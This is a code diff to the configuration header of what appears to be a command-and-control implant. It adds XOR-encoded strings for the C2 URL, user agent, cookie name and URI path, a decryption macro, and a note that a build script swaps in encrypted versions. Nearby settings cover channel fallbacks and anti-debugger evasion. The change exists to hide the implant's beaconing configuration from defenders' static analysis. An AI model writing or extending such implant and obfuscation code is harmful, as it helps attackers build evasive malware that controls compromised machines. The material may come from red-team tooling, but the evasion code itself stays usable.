@@ -37,8 +37,41 @@
 #define CONFIG_DNS_ENABLED  0   /* 0 = disabled, 1 = enabled */
 
 /* ─── Channel priority (comma-separated: http,smb,dns) ─── */
-#define CONFIG_CHANNEL_PRIORITY  "http"
 #define CONFIG_CHANNEL_MAX_FAILURES  5
+
+/* Plaintext fallback for dev builds without build_agent_c.py.
+   The build script replaces this entire file with XOR-encrypted versions. */
+#ifndef CONFIG_XOR_KEY
+#define CONFIG_XOR_KEY 0x00
+static const unsigned char CONFIG_CHANNEL_PRIORITY_ENC[] = {'h','t','t','p'};
+#define CONFIG_CHANNEL_PRIORITY_LEN 4
+#define DECRYPT_CONFIG(dest, name) do { \
+    for (unsigned int _i = 0; _i < CONFIG_##name##_LEN; _i++) \
+        (dest)[_i] = (char)(CONFIG_##name##_ENC[_i] ^ CONFIG_XOR_KEY); \
+    (dest)[CONFIG_##name##_LEN] = '\0'; \
+} while(0)
+/* Also provide other encrypted configs as plaintext for dev builds */
+static const unsigned char CONFIG_C2_URL_ENC[] = {'h','t','t','p','s',':','/','/','1','2','7','.','0','.','0','.','1',':','8','4','4','3','/','a','p','i','/','v','1'};
+#define CONFIG_C2_URL_LEN 29
+static const unsigned char CONFIG_USER_AGENT_ENC[] = {'M','o','z','i','l','l','a','/','5','.','0'};
+#define CONFIG_USER_AGENT_LEN 11
+static const unsigned char CONFIG_COOKIE_NAME_ENC[] = {'s','e','s','s','i','o','n'};
+#define CONFIG_COOKIE_NAME_LEN 7
+static const unsigned char CONFIG_AGENT_VER_ENC[] = {'1','.','0','.','0'};
+#define CONFIG_AGENT_VER_LEN 5
+static const unsigned char CONFIG_RESP_WRAPPER_BEFORE_ENC[] = {0};
+#define CONFIG_RESP_WRAPPER_BEFORE_LEN 0
+static const unsigned char CONFIG_RESP_WRAPPER_AFTER_ENC[] = {0};
+#define CONFIG_RESP_WRAPPER_AFTER_LEN 0
+static const unsigned char CONFIG_URI_PATH_ENC[] = {'/','a','p','i','/','v','1'};
+#define CONFIG_URI_PATH_LEN 7
+static const unsigned char CONFIG_PIPE_NAME_ENC[] = {0};
+#define CONFIG_PIPE_NAME_LEN 0
+static const unsigned char CONFIG_PIPE_HOST_ENC[] = {0};
+#define CONFIG_PIPE_HOST_LEN 0
+static const unsigned char CONFIG_DNS_DOMAIN_ENC[] = {0};
+#define CONFIG_DNS_DOMAIN_LEN 0
+#endif /* CONFIG_XOR_KEY */
 
 /* ─── Evasion toggles ─── */
 #define CONFIG_ANTI_DEBUG       1   /* 1 = check for debuggers at startup */
